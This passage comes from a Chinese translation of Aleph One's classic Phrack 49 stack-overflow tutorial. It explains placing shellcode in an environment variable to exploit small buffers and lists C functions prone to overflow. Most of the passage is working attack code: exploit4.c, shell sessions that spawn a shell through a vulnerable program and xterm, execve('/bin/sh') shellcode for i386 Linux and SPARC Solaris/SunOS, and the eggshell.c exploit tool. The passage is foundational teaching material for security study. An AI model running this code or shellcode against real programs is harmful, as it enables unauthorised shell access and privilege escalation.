~~~~~~~~~~~~~~~~<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp; 有时候想使其溢出的缓冲区太小了, 以至于shellcode都放不进去, 这样返回地址就<BR>会被指令所覆盖, 而不是我们所推测的地址, 或者shellcode是放进去了, 但是没法填充<BR>足够多的NOP指令, 这样推测地址的成功率就很低了. 要从这样的程序(小缓冲区)里得到<BR>一个shell, 我们必须得想其他办法. 下面介绍的这种方法只在能够访问程序的环境变量<BR>时有效.<BR><BR>&nbsp;&nbsp;&nbsp; 我们所做的就是把shellcode放到环境变量中去, 然后用这个变量在内存中的地址来<BR>使缓冲区溢出. 这种方法同时也提高了破解工作的成功率, 因为保存shellcode的环境变<BR>量想要多大就有多大.<BR><BR>&nbsp;&nbsp;&nbsp; 当程序开始时, 环境变量存储在堆栈的顶部, 任何使用setenv()的修改动作会在其他<BR>地方重新分配空间. 开始时的堆栈如下所示:<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;strings&gt;&lt;argv pointers&gt;NULL&lt;envp pointers&gt;NULL&lt;argc&gt;&lt;argv&gt;&lt;envp&gt;<BR><BR>&nbsp;&nbsp;&nbsp; 我们新的程序会使用一个额外的变量, 变量的大小能够容纳shellcode和NOP指令,<BR>新的破解程序如下所示:<BR><BR>exploit4.c<BR>------------------------------------------------------------------------------<BR>#include &lt;stdlib.h&gt;<BR><BR>#define DEFAULT_OFFSET&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0<BR>#define DEFAULT_BUFFER_SIZE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 512<BR>#define DEFAULT_EGG_SIZE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2048<BR>#define NOP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x90<BR><BR>char shellcode[] =<BR>&nbsp; "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"<BR>&nbsp; "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"<BR>&nbsp; "\x80\xe8\xdc\xff\xff\xff/bin/sh";<BR><BR>unsigned long get_esp(void) {<BR>&nbsp;&nbsp; __asm__("movl %esp,%eax");<BR>}<BR><BR>void main(int argc, char *argv[]) {<BR>&nbsp; char *buff, *ptr, *egg;<BR>&nbsp; long *addr_ptr, addr;<BR>&nbsp; int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;<BR>&nbsp; int i, eggsize=DEFAULT_EGG_SIZE;<BR><BR>&nbsp; if (argc &gt; 1) bsize&nbsp;&nbsp; = atoi(argv[1]);<BR>&nbsp; if (argc &gt; 2) offset&nbsp; = atoi(argv[2]);<BR>&nbsp; if (argc &gt; 3) eggsize = atoi(argv[3]);<BR><BR><BR>&nbsp; if (!(buff = malloc(bsize))) {<BR>&nbsp;&nbsp;&nbsp; printf("Can't allocate memory.\n");<BR>&nbsp;&nbsp;&nbsp; exit(0);<BR>&nbsp; }<BR>&nbsp; if (!(egg = malloc(eggsize))) {<BR>&nbsp;&nbsp;&nbsp; printf("Can't allocate memory.\n");<BR>&nbsp;&nbsp;&nbsp; exit(0);<BR>&nbsp; }<BR><BR>&nbsp; addr = get_esp() - offset;<BR>&nbsp; printf("Using address: 0x%x\n", addr);<BR><BR>&nbsp; ptr = buff;<BR>&nbsp; addr_ptr = (long *) ptr;<BR>&nbsp; for (i = 0; i &lt; bsize; i+=4)<BR>&nbsp;&nbsp;&nbsp; *(addr_ptr++) = addr;<BR><BR>&nbsp; ptr = egg;<BR>&nbsp; for (i = 0; i &lt; eggsize - strlen(shellcode) - 1; i++)<BR>&nbsp;&nbsp;&nbsp; *(ptr++) = NOP;<BR><BR>&nbsp; for (i = 0; i &lt; strlen(shellcode); i++)<BR>&nbsp;&nbsp;&nbsp; *(ptr++) = shellcode[i];<BR><BR>&nbsp; buff[bsize - 1] = '\0';<BR>&nbsp; egg[eggsize - 1] = '\0';<BR><BR>&nbsp; memcpy(egg,"EGG=",4);<BR>&nbsp; putenv(egg);<BR>&nbsp; memcpy(buff,"RET=",4);<BR>&nbsp; putenv(buff);<BR>&nbsp; system("/bin/bash");<BR>}<BR>------------------------------------------------------------------------------<BR><BR>&nbsp;&nbsp;&nbsp; 用这个新的破解程序来试试我们的漏洞测试程序:<BR>&nbsp;&nbsp;&nbsp; <BR>------------------------------------------------------------------------------<BR>[aleph1]$ ./exploit4 768<BR>Using address: 0xbffffdb0<BR>[aleph1]$ ./vulnerable $RET<BR>$<BR>------------------------------------------------------------------------------<BR><BR>&nbsp;&nbsp;&nbsp; 成功了, 再试试xterm:<BR>&nbsp;&nbsp;&nbsp; <BR>------------------------------------------------------------------------------<BR>[aleph1]$ export DISPLAY=:0.0<BR>[aleph1]$ ./exploit4 2148<BR>Using address: 0xbffffdb0<BR>[aleph1]$ /usr/X11R6/bin/xterm -fg $RET<BR>Warning: Color name<BR>"挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨<BR>挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨挨<BR><BR><BR>(此处截短多行输出)<BR><BR>挨挨挨<BR>Warning: some arguments in previous message were lost<BR>$<BR>------------------------------------------------------------------------------<BR><BR>&nbsp;&nbsp;&nbsp; 一次成功! 它显著提高了我们的成功率. 依赖于破解程序和被破解程序比较环境数据<BR>的多少, 我们推测的地址可能高也可能低于真值. 正和负的偏移量都可以试一试.<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 寻找缓冲区溢出漏洞<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ~~~~~~~~~~~~~~~~~~~~~<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp; 如前所述, 缓冲区溢出是向一个缓冲区填充超过其处理能力的信息造成的结果. 由于C<BR>语言没有任何内置的边界检查, 写入一个字符数组时, 如果超越了数组的结尾就会造成溢<BR>出. 标准C语言库提供了一些没有边界检查的字符串复制或添加函数. 包括strcat(), <BR>strcpy(), sprintf(), and vsprintf(). 这些函数对一个null结尾的字符串进行操作, 并<BR>不检查溢出情况. gets()函数从标准输入中读取一行到缓冲区中, 直到换行或EOF. 它也不<BR>检查缓冲区溢出. scanf()函数族在匹配一系列非空格字符(%s), 或从指定集合(%[])中匹<BR>配非空系列字符时, 使用字符指针指向数组, 并且没有定义最大字段宽度这个可选项, 就<BR>可能出现问题. 如果这些函数的目标地址是一个固定大小的缓冲区, 函数的另外参数是由<BR>用户以某种形式输入, 则很有可能利用缓冲区溢出来破解它.<BR><BR>&nbsp;&nbsp;&nbsp; 另一种常见的编程结构是使用while循环从标准输入或某个文件中一次读入一个字符到<BR>缓冲区中, 直到行尾或文件结尾, 或者碰到别的什么终止符. 这种结构通常使用getc(), <BR>fgetc(), 或getchar()函数中的某一个. 如果在while循环中没有明确的溢出检查, 这种程<BR>序就很容易被破解.<BR><BR>&nbsp;&nbsp;&nbsp; 由此可见, grep(1)是一个很好的工具命令(帮助你找到程序中可能有的漏洞). 自由操<BR>作系统及其工具的源码是可读的. 当你意识到其实很多商业操作系统工具都和自由软件有<BR>着相同的源码时, 剩下的事情就简单了!&nbsp; :-)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 附录 A - 不同操作系统/体系结构的shellcode&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ <BR><BR>i386/Linux<BR>------------------------------------------------------------------------------<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jmp&nbsp;&nbsp;&nbsp; 0x1f<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; popl&nbsp;&nbsp; %esi<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %esi,0x8(%esi)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xorl&nbsp;&nbsp; %eax,%eax<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movb&nbsp;&nbsp; %eax,0x7(%esi)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %eax,0xc(%esi)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movb&nbsp;&nbsp; $0xb,%al<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %esi,%ebx<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; leal&nbsp;&nbsp; 0x8(%esi),%ecx<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; leal&nbsp;&nbsp; 0xc(%esi),%edx<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp; $0x80<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xorl&nbsp;&nbsp; %ebx,%ebx<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl&nbsp;&nbsp; %ebx,%eax<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; inc&nbsp;&nbsp;&nbsp; %eax<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp; $0x80<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call&nbsp;&nbsp; -0x24<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; .string \"/bin/sh\"<BR>------------------------------------------------------------------------------<BR><BR>SPARC/Solaris<BR>------------------------------------------------------------------------------<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sethi&nbsp;&nbsp; 0xbd89a, %l6<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; or&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; %l6, 0x16e, %l6<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sethi&nbsp;&nbsp; 0xbdcda, %l7<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; and&nbsp;&nbsp;&nbsp;&nbsp; %sp, %sp, %o0<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; add&nbsp;&nbsp;&nbsp;&nbsp; %sp, 8, %o1<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor&nbsp;&nbsp;&nbsp;&nbsp; %o2, %o2, %o2<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; add&nbsp;&nbsp;&nbsp;&nbsp; %sp, 16, %sp<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; std&nbsp;&nbsp;&nbsp;&nbsp; %l6, [%sp - 16]<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; st&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; %sp, [%sp - 8]<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; st&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; %g0, [%sp - 4]<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; 0x3b, %g1<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ta&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 8<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor&nbsp;&nbsp;&nbsp;&nbsp; %o7, %o7, %o0<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; 1, %g1<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ta&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 8<BR>------------------------------------------------------------------------------<BR><BR>SPARC/SunOS<BR>------------------------------------------------------------------------------<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sethi&nbsp;&nbsp; 0xbd89a, %l6<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; or&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; %l6, 0x16e, %l6<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sethi&nbsp;&nbsp; 0xbdcda, %l7<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; and&nbsp;&nbsp;&nbsp;&nbsp; %sp, %sp, %o0<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; add&nbsp;&nbsp;&nbsp;&nbsp; %sp, 8, %o1<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor&nbsp;&nbsp;&nbsp;&nbsp; %o2, %o2, %o2<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; add&nbsp;&nbsp;&nbsp;&nbsp; %sp, 16, %sp<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; std&nbsp;&nbsp;&nbsp;&nbsp; %l6, [%sp - 16]<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; st&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; %sp, [%sp - 8]<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; st&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; %g0, [%sp - 4]<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; 0x3b, %g1<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; -0x1, %l5<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ta&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; %l5 + 1<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor&nbsp;&nbsp;&nbsp;&nbsp; %o7, %o7, %o0<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp;&nbsp; 1, %g1<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ta&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; %l5 + 1<BR>------------------------------------------------------------------------------<BR>&nbsp;&nbsp; <BR>&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 附录 B - 通用缓冲区溢出程序&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR><BR>shellcode.h<BR>------------------------------------------------------------------------------<BR>#if defined(__i386__) &amp;&amp; defined(__linux__)<BR><BR>#define NOP_SIZE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1<BR>char nop[] = "\x90";<BR>char shellcode[] =<BR>&nbsp; "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"<BR>&nbsp; "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"<BR>&nbsp; "\x80\xe8\xdc\xff\xff\xff/bin/sh";<BR><BR>unsigned long get_sp(void) {<BR>&nbsp;&nbsp; __asm__("movl %esp,%eax");<BR>}<BR><BR>#elif defined(__sparc__) &amp;&amp; defined(__sun__) &amp;&amp; defined(__svr4__)<BR><BR>#define NOP_SIZE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 4<BR>char nop[]="\xac\x15\xa1\x6e";<BR>char shellcode[] =<BR>&nbsp; "\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xdc\xda\x90\x0b\x80\x0e"<BR>&nbsp; "\x92\x03\xa0\x08\x94\x1a\x80\x0a\x9c\x03\xa0\x10\xec\x3b\xbf\xf0"<BR>&nbsp; "\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\x91\xd0\x20\x08"<BR>&nbsp; "\x90\x1b\xc0\x0f\x82\x10\x20\x01\x91\xd0\x20\x08";<BR><BR>unsigned long get_sp(void) {<BR>&nbsp; __asm__("or %sp, %sp, %i0");<BR>}<BR><BR>#elif defined(__sparc__) &amp;&amp; defined(__sun__)<BR><BR>#define NOP_SIZE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 4<BR>char nop[]="\xac\x15\xa1\x6e";<BR>char shellcode[] =<BR>&nbsp; "\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xdc\xda\x90\x0b\x80\x0e"<BR>&nbsp; "\x92\x03\xa0\x08\x94\x1a\x80\x0a\x9c\x03\xa0\x10\xec\x3b\xbf\xf0"<BR>&nbsp; "\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc\x82\x10\x20\x3b\xaa\x10\x3f\xff"<BR>&nbsp; "\x91\xd5\x60\x01\x90\x1b\xc0\x0f\x82\x10\x20\x01\x91\xd5\x60\x01";<BR><BR>unsigned long get_sp(void) {<BR>&nbsp; __asm__("or %sp, %sp, %i0");<BR>}<BR><BR>#endif<BR>------------------------------------------------------------------------------<BR><BR>eggshell.c<BR>------------------------------------------------------------------------------<BR>/*<BR> * eggshell v1.0<BR> *<BR> * Aleph One / aleph1@underground.org<BR> */<BR>#include &lt;stdlib.h&gt;<BR>#include &lt;stdio.h&gt;<BR>#include "shellcode.h"<BR><BR>#define DEFAULT_OFFSET&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0<BR>#define DEFAULT_BUFFER_SIZE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 512<BR>#define DEFAULT_EGG_SIZE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2048<BR><BR>void usage(void);<BR><BR>void main(int argc, char *argv[]) {<BR>&nbsp; char *ptr, *bof, *egg;<BR>&nbsp; long *addr_ptr, addr;<BR>&nbsp; int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;<BR>&nbsp; int i, n, m, c, align=0, eggsize=DEFAULT_EGG_SIZE;<BR><BR>&nbsp; while ((c = getopt(argc, argv, "a:b:e:o:")) != EOF)<BR>&nbsp;&nbsp;&nbsp; switch (c) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case 'a':<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; align = atoi(optarg);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case 'b':<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bsize = atoi(optarg);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case 'e':<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eggsize = atoi(optarg);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case 'o':<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; offset = atoi(optarg);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; case '?':<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; usage();<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(0);<BR>&nbsp;&nbsp;&nbsp; }<BR><BR>&nbsp; if (strlen(shellcode) &gt; eggsize) {<BR>&nbsp;&nbsp;&nbsp; printf("Shellcode is larger the the egg.\n");<BR>&nbsp;&nbsp;&nbsp; exit(0);<BR>&nbsp; }<BR><BR>&nbsp; if (!(bof = malloc(bsize))) {<BR>&nbsp;&nbsp;&nbsp; printf("Can't allocate memory.\n");<BR>&nbsp;&nbsp;&nbsp; exit(0);<BR>&nbsp; }<BR>&nbsp; if (!(egg = malloc(eggsize))) {<BR>&nbsp;&nbsp;&nbsp; printf("Can't allocate memory.\n");<BR>&nbsp;&nbsp;&nbsp; exit(0);<BR>&nbsp; }<BR><BR>&nbsp; addr = get_sp() - offset;<BR>&nbsp; printf("[ Buffer size:\t%d\t\tEgg size:\t%d\tAligment:\t%d\t]\n",<BR>&nbsp;&nbsp;&nbsp; bsize, eggsize, align);<BR>&nbsp; printf("[ Address:\t0x%x\tOffset:\t\t%d\t\t\t\t]\n", addr, offset);<BR><BR>&nbsp; addr_ptr = (long *) bof;<BR>&nbsp; for (i = 0; i &lt; bsize; i+=4)<BR>&nbsp;&nbsp;&nbsp; *(addr_ptr++) = addr;<BR><BR>&nbsp; ptr = egg;<BR>&nbsp; for (i = 0; i &lt;= eggsize - strlen(shellcode) - NOP_SIZE; i += NOP_SIZE)<BR>&nbsp;&nbsp;&nbsp; for (n = 0; n &lt; NOP_SIZE; n++) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m = (n + align) % NOP_SIZE;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *(ptr++) = nop[m];<BR>&nbsp;&nbsp;&nbsp; }<BR><BR>&nbsp; for (i = 0; i &lt; strlen(shellcode); i++)<BR>&nbsp;&nbsp;&nbsp; *(ptr++) = shellcode[i];<BR><BR>&nbsp; bof[bsize - 1] = '\0';<BR>&nbsp; egg[eggsize - 1] = '\0';<BR><BR>&nbsp; memcpy(egg,"EGG=",4);<BR>&nbsp; putenv(egg);<BR><BR>&nbsp; memcpy(bof,"BOF=",4);<BR>&nbsp; putenv(bof);<BR>&nbsp; system("/bin/sh");<BR>}<BR><BR>void usage(void) {<BR>&nbsp; (void)fprintf(stderr,<BR>&nbsp;&nbsp;&nbsp; "usage: eggshell [-a &lt;alignment&gt;] [-b &lt;buffersize&gt;] [-e &lt;eggsize&gt;] [-o &lt;offs<BR>et&gt;]\n");<BR>}<BR>------------------------------------------------------------------------------<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR><BR><BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; .oO Phrack 49 Oo.<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Volume Seven, Issue Forty-Nine<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; File 14 of 16<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; BugTraq, r00t, and 